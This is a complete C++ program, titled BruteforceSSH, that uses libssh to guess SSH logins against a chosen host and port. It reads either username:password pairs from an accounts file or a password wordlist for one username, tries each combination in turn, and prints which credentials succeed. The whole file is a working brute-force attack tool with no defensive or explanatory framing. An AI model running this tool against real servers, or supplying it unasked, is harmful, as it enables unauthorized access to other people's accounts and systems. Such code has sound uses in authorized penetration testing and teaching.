#include <cxxopts.hpp>

#include <libssh/libssh.h>

#include <fstream>
#include <iostream>
#include <sstream>
#include <string>

bool SSHConnect(const std::string &hostname, int port, const std::string &username, const std::string &password, int timeout) {
    ssh_session session = ssh_new();
    if (session == nullptr)
        return false;

    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519,ssh-rsa,ssh-dss");

    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        std::cerr << "Error connecting to " << hostname << ": " << ssh_get_error(session) << std::endl;
        ssh_free(session);
        return false;
    }

    rc = ssh_userauth_password(session, nullptr, password.c_str());
    if (rc == SSH_AUTH_SUCCESS) {
        std::cout << "Success: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    } else {
        std::cerr << "Failure: " << username << ":" << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return false;
    }
}

bool SSHConnectAccounts(const std::string &filename, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open accounts file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string username;
        std::string password;

        if (std::getline(iss, username, ':') && std::getline(iss, password)) {
            if (SSHConnect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

bool SSHConnectPasswords(const std::string &filename, const std::string &username, const std::string &hostname, int port, int timeout) {
    std::ifstream file(filename);
    std::string line;

    if (!file.is_open()) {
        std::cerr << "Failed to open passwords file: " << filename << std::endl;
        return false;
    }

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string password;

        if (std::getline(iss, password)) {
            if (SSHConnect(hostname, port, username, password, timeout)) {
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char *argv[]) {
    try {
        cxxopts::Options options("BruteforceSSH");

        // clang-format off
        options.add_options()
            ("a,accounts", "Accounts file", cxxopts::value<std::string>())
            ("p,passwords", "Passwords file", cxxopts::value<std::string>())
            ("u,username", "Username", cxxopts::value<std::string>())
            ("h,hostname", "Hostname", cxxopts::value<std::string>()->default_value("127.0.0.1"))
            ("P,port", "Port", cxxopts::value<int>()->default_value("22"))
            ("t,timeout", "Timeout (seconds)", cxxopts::value<int>()->default_value("30"))
            ("help", "Print help");
        // clang-format on

        auto result = options.parse(argc, argv);

        if (result.count("help")) {
            std::cout << options.help() << std::endl;
            return 0;
        }

        std::string hostname = result["hostname"].as<std::string>();
        int port = result["port"].as<int>();
        int timeout = result["timeout"].as<int>();

        if (result.count("accounts")) {
            std::string filename = result["accounts"].as<std::string>();
            SSHConnectAccounts(filename, hostname, port, timeout);
        } else if (result.count("passwords") && result.count("username")) {
            std::string filename = result["passwords"].as<std::string>();
            std::string username = result["username"].as<std::string>();
            SSHConnectPasswords(filename, username, hostname, port, timeout);
        } else {
            std::cerr << "You must specify either an accounts file or a passwords file with a username." << std::endl;
            std::cout << options.help() << std::endl;
            return 1;
        }
    } catch (const cxxopts::exceptions::exception &e) {
        std::cerr << "Error parsing options: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
